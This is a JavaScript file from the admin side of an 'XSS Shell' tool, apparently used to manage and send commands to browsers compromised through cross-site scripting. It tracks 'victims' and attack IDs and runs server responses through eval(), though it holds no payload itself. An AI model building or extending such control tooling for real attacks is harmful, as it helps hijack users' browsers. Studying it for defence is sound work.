/*
	XSS Shell Admin related JS Functions

	10/08/2006
		- Started

*/

var CALLBACK_PARAM = "<<RESPONSE>>";
var SAVE_URL = "save.asp";
var LOGS_URL = "default.asp?c=1";
var VICTIMS_URL = "default.asp?c=2";

var d = document;


// Internal
var DEBUG_DIV = "debugshell";


/* 

 External Source Code from : http://www.jibbering.com/2002/4/httprequest.html

*/

var xmlhttp=false;
/*@cc_on @*/
/*@if (@_jscript_version >= 5)
// JScript gives us Conditional compilation, we can cope with old IE versions.
// and security blocked creation of the objects.
 try {
  xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
 } catch (e) {
  try {
   xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
  } catch (E) {
   xmlhttp = false;
  }
 }
@end @*/
if (!xmlhttp && typeof XMLHttpRequest!='undefined') {
	try {
		xmlhttp = new XMLHttpRequest();
	} catch (e) {
		xmlhttp=false;
	}
}
if (!xmlhttp && window.createRequest) {
	try {
		xmlhttp = window.createRequest();
	} catch (e) {
		xmlhttp=false;
	}
}



/*
	Generatre Random ID for AttackID (fix it with more random and unique stuff)
*/
function generateID(){
	return Math.floor(Math.random()*999999999);
}


// Command Structure
function command(cmd, param, attackID) { 
	this.cmd = cmd;
	this.param = param.split(","); // Convert to array
	this.attackID = attackID;
}

/*

	DESCRIPTION;
		Parse raw command request array and returns as new command

		@rawCmd : Not exactly it's an array
		@baseId : Array start point

	RETURN;
		- New Command

*/

function parseCommand(rawCmd, baseId){
	return new command(rawCmd[baseId], rawCmd[baseId+1], rawCmd[baseId+2]);
}

/*

	DESCRIPTION;
		Write debug information to DEBUG_DIV
	
	@msg	: Debug Message

	REMARKS;
		- Only for debug...


*/
function debug(msg){
	return;
	generateDebugConsole();
	d.getElementById(DEBUG_DIV).innerHTML += "- " + msg + "<br>" ;

}

/*

	DESCRIPTION;
		Check for debug console generate if it's not already around
	
	REMARKS;
		- Only for debug...

*/

function generateDebugConsole(){


	if(d.getElementById(DEBUG_DIV) == null) {
		
		var debugConsole;
		debugConsole = d.createElement("div");
		debugConsole.innerHTML = "<strong>Debug Console!</strong><hr>";
		debugConsole.id = DEBUG_DIV;
		
		d.body.appendChild(debugConsole);

		//debugConsole.className = DEBUG_DIV; // Damn its not working in IE I dont know why! so I did it by my dirty JS hands
		
		var dc = debugConsole.style;

		
		dc.color = "#0F0";
		dc.backgroundColor="#000";
		dc.padding="3px";
		dc.width = "400px";
		dc.border="1px solid #F00";
		dc.fontSize="11px";
		dc.fontFamily="Lucida Sans";
	
		new Draggable(debugConsole);
	}


}


/*

	DESCRIPTION;
		Core communication function
		
		@url			: Request URL
		@evalCallBack	: Dirty Callback implementation, Function as String

	REMARK;
		- Use CALLBACK_PARAM Const for response parameter like "trigger("+CALLBACK_PARAM+")"
	
*/

function getRequest(url, evalCallBack){
	// This will possibly blown up in a JS optimizer! So fix it or disable variable name optimization
	// Yeah eval() == evil();
	
	xmlhttp.open("GET", url, true);
	xmlhttp.onreadystatechange=function() {
		if (xmlhttp.readyState==4) {		
			
			// Response
			if (evalCallBack != "" && evalCallBack != null){
				evalCallBack = evalCallBack.replace(CALLBACK_PARAM, "xmlhttp.responseText"); 
				eval(evalCallBack);
			}

		}

	}
	xmlhttp.send(null)
}

